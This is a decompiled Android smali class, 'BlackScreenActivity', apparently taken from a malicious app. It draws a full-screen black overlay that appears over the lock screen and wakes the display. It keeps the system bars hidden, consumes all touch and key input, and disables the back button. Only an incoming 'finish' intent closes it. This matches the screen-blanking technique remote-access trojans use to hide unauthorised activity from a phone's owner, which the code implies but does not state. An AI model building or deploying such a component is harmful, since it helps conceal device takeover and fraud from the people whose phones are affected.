.class public Lcom/servers/ozzbzk/BlackScreenActivity;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 24
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private handleFinishIntent(Landroid/content/Intent;)Z
    .locals 1

    if-eqz p1, :cond_0

    .line 73
    const-string v0, "action"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "finish"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 74
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BlackScreenActivity;->finish()V

    const/4 p1, 0x1

    return p1

    :cond_0
    const/4 p1, 0x0

    return p1
.end method


# virtual methods
.method public dispatchTouchEvent(Landroid/view/MotionEvent;)Z
    .locals 0

    const/4 p1, 0x1

    return p1
.end method

.method public onBackPressed()V
    .locals 0

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 28
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 30
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BlackScreenActivity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/servers/ozzbzk/BlackScreenActivity;->handleFinishIntent(Landroid/content/Intent;)Z

    move-result p1

    if-eqz p1, :cond_0

    return-void

    :cond_0
    const/4 p1, 0x1

    .line 34
    invoke-virtual {p0, p1}, Lcom/servers/ozzbzk/BlackScreenActivity;->requestWindowFeature(I)Z

    .line 36
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BlackScreenActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const v1, 0x680680

    .line 37
    invoke-virtual {v0, v1}, Landroid/view/Window;->addFlags(I)V

    .line 44
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1b

    if-lt v1, v2, :cond_1

    .line 45
    invoke-virtual {p0, p1}, Lcom/servers/ozzbzk/BlackScreenActivity;->setShowWhenLocked(Z)V

    .line 46
    invoke-virtual {p0, p1}, Lcom/servers/ozzbzk/BlackScreenActivity;->setTurnScreenOn(Z)V

    .line 49
    :cond_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1c

    if-lt v1, v2, :cond_2

    .line 50
    invoke-virtual {v0}, Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;

    move-result-object v0

    iput p1, v0, Landroid/view/WindowManager$LayoutParams;->layoutInDisplayCutoutMode:I

    .line 54
    :cond_2
    new-instance p1, Landroid/view/View;

    invoke-direct {p1, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    const/high16 v0, -0x1000000

    .line 55
    invoke-virtual {p1, v0}, Landroid/view/View;->setBackgroundColor(I)V

    const/16 v0, 0x1706

    .line 56
    invoke-virtual {p1, v0}, Landroid/view/View;->setSystemUiVisibility(I)V

    .line 63
    invoke-virtual {p0, p1}, Lcom/servers/ozzbzk/BlackScreenActivity;->setContentView(Landroid/view/View;)V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 0

    const/4 p1, 0x1

    return p1
.end method

.method public onKeyUp(ILandroid/view/KeyEvent;)Z
    .locals 0

    const/4 p1, 0x1

    return p1
.end method

.method protected onNewIntent(Landroid/content/Intent;)V
    .locals 0

    .line 68
    invoke-super {p0, p1}, Landroid/app/Activity;->onNewIntent(Landroid/content/Intent;)V

    .line 69
    invoke-direct {p0, p1}, Lcom/servers/ozzbzk/BlackScreenActivity;->handleFinishIntent(Landroid/content/Intent;)Z

    return-void
.end method

.method public onTouchEvent(Landroid/view/MotionEvent;)Z
    .locals 0

    const/4 p1, 0x1

    return p1
.end method

.method public onWindowFocusChanged(Z)V
    .locals 1

    .line 107
    invoke-super {p0, p1}, Landroid/app/Activity;->onWindowFocusChanged(Z)V

    if-eqz p1, :cond_0

    .line 109
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BlackScreenActivity;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object p1

    const/16 v0, 0x1706

    invoke-virtual {p1, v0}, Landroid/view/View;->setSystemUiVisibility(I)V

    :cond_0
    return-void
.end method
